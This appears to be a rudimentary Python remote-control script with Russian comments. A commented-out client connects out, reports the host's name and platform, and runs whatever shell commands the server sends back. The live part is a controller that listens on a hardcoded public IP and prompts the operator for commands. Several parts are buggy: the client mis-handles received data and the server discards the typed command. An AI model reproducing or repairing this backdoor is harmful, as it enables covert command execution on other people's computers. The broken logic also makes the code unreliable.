# import socket
# import subprocess
# import base64
# import platform
# sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# server_ip = 'localhost'
# server_host = 12391
# sock.connect((server_ip, server_host))
# sock.send(base64.b64encode('online:{}:{}'.format(socket.gethostname(), platform.platform()).encode('utf-8')))
# while True:
#     answer = sock.recv(1024)
#     server_answer, addr = answer
#     sock.send(base64.b64encode(subprocess.check_output(server_answer.decode('utf-8'), shell=True)).encode('utf-8'))
import socket
import base64

# Задаем адрес сервера
SERVER_ADDRESS = ('176.115.90.172', 12395)

# Настраиваем сокет
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind(SERVER_ADDRESS)
server_socket.listen(10)
print('server is running, please, press ctrl+c to stop')

# Слушаем запросы
while True:
    try:
        connection, address = server_socket.accept()
        print("new connection from {address}".format(address=address))

        data = connection.recv(1024)
        print(base64.b64decode(data.decode('utf-8')).decode('utf-8'))
        while True:
            cmd = input('CMD> ')
            connection.send(base64.b64encode('hello, too!'.encode('utf-8')))

        connection.close()
    except:
        break

server_socket.close()
